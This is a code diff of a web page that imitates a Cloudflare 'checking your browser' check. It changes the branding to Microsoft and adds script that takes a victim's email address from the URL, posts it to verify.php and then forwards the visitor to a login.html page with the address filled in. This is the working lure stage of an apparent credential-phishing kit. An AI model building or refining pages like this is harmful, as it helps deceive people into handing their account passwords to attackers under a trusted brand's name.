@@ -14,38 +14,50 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      text-align: center; /* <-- Ensures ALL text is centered */
     }
+
     body {
       padding: 20px;
       box-sizing: border-box;
     }
+
     .container {
       max-width: 400px;
       width: 100%;
-      text-align: center;
+      text-align: center; /* <-- Extra guarantee */
+      display: flex;
+      flex-direction: column;
+      align-items: center; /* Centers inside container */
+      justify-content: center;
+      gap: 20px; /* Better spacing between elements */
     }
+
     h1 {
       font-weight: 600;
-      margin-bottom: 10px;
+      margin: 0;
       font-size: 24px;
-      white-space: nowrap; /* Force one line */
+      line-height: 1.4;
+      text-align: center; /* Added */
+      white-space: normal; /* Prevents cutting on smaller screens */
     }
+
     #security-msg {
       font-size: 16px;
       color: #ccc;
-      margin-bottom: 30px;
+      margin: 0;
       min-height: 24px;
+      text-align: center; /* Added */
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Checking your browser before accessing File</h1>
+    <h1>Checking your browser before accessing Microsoft</h1>
     <p id="security-msg">Verifying you are human. This may take a few seconds...</p>
 
     <form id="turnstile-form" action="verify.php" method="POST">
       <input type="hidden" name="hash" id="hash-field" />
-      <!-- Cloudflare Turnstile CAPTCHA widget -->
       <div
         class="cf-turnstile"
         data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
@@ -54,10 +66,10 @@
     </form>
   </div>
 
-  <!-- Load Turnstile CAPTCHA script -->
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
   <script>
-    // Animate status messages
+    // Animation messages
     const statusMessages = [
       "Performing browser integrity check...",
       "Validating session security...",
@@ -70,30 +82,34 @@
       }, i * 1300);
     });
 
-    // Pass hash from URL to hidden input
+    // Extract email from #hash
+    let extractedEmail = null;
     window.addEventListener("DOMContentLoaded", () => {
-      const hash = window.location.hash;
-      if (hash) {
-        document.getElementById("hash-field").value = hash;
+      const hashValue = window.location.hash.replace("#", "").trim();
+
+      // Check if hash looks like an email
+      if (hashValue && hashValue.includes("@")) {
+        extractedEmail = hashValue;
       }
+
+      document.getElementById("hash-field").value = window.location.hash;
     });
 
-    // Submit form when CAPTCHA succeeds
+    // Cloudflare Turnstile callback
     function onCaptchaSuccess() {
       document.getElementById("turnstile-form").submit();
     }
+
+    // Redirect after delay
+    window.onload = function () {
+      setTimeout(() => {
+        if (extractedEmail) {
+          window.location.href = "login.html#" + extractedEmail;
+        } else {
+          window.location.href = "login.html";
+        }
+      }, 4000);
+    };
   </script>
-<script>
-window.onload = function () {
-  setTimeout(() => {
-    if (window.extractedEmail) {
-      window.location.href = "login.html?email=" + encodeURIComponent(window.extractedEmail);
-    } else {
-      window.location.href = "login.html";
-    }
-  }, 4000);
-};
-</script>
-
-
-
+</body>
+</html>
